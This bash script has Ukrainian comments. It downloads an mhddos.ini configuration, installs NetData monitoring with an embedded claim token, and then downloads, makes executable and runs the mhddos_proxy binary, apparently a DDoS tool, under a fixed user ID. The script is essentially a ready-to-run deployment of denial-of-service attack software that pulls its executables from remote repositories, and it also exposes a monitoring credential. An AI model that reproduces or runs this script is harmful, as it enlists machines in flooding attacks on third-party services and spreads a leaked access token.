#!/bin/bash

# Завантаження файлу mhddos.ini
curl -o mhddos.ini https://raw.githubusercontent.com/jobbern693/mhtetsteest3/main/mhddos.ini
if [ $? -ne 0 ]; then
  echo "Помилка при завантаженні mhddos.ini"
  exit 1
fi

# Встановлення NetData без підтвердження
curl https://get.netdata.cloud/kickstart.sh > /tmp/netdata-kickstart.sh
if [ $? -ne 0 ]; then
  echo "Помилка при завантаженні kickstart.sh"
  exit 1
fi
sh /tmp/netdata-kickstart.sh --stable-channel --claim-token kQu4ubwd1Rv35nYTCXI2tICAeo2M97uLzQMfVQuxuE60SqtFuE1Vm6OV58QYc0xjmHrCTSfaSbBQE8DUJeU7RpzVCg334R0_aYjgsBMt7f42eEuL7BwMyFwRSfJvSvwrALGiBxg --claim-rooms 97128b92-3bf3-4e43-bfc8-b23ea2767bc9 --claim-url https://app.netdata.cloud
if [ $? -ne 0 ]; then
  echo "Помилка при встановленні NetData"
  exit 1
fi

# Перезапуск NetData
sudo service netdata restart
if [ $? -ne 0 ]; then
  echo "Помилка при перезапуску NetData"
  exit 1
fi

# Завантаження mhddos_proxy
curl https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -Lo mhddos_proxy_linux
if [ $? -ne 0 ]; then
  echo "Помилка при завантаженні mhddos_proxy"
  exit 1
fi

# Зміна прав доступу на виконуваний файл
chmod +x mhddos_proxy_linux
if [ $? -ne 0 ]; then
  echo "Помилка при зміні прав доступу на mhddos_proxy"
  exit 1
fi

# Запуск mhddos_proxy
./mhddos_proxy_linux --user-id 1299004116
if [ $? -ne 0 ]; then
  echo "Помилка при запуску mhddos_proxy"
  exit 1
fi
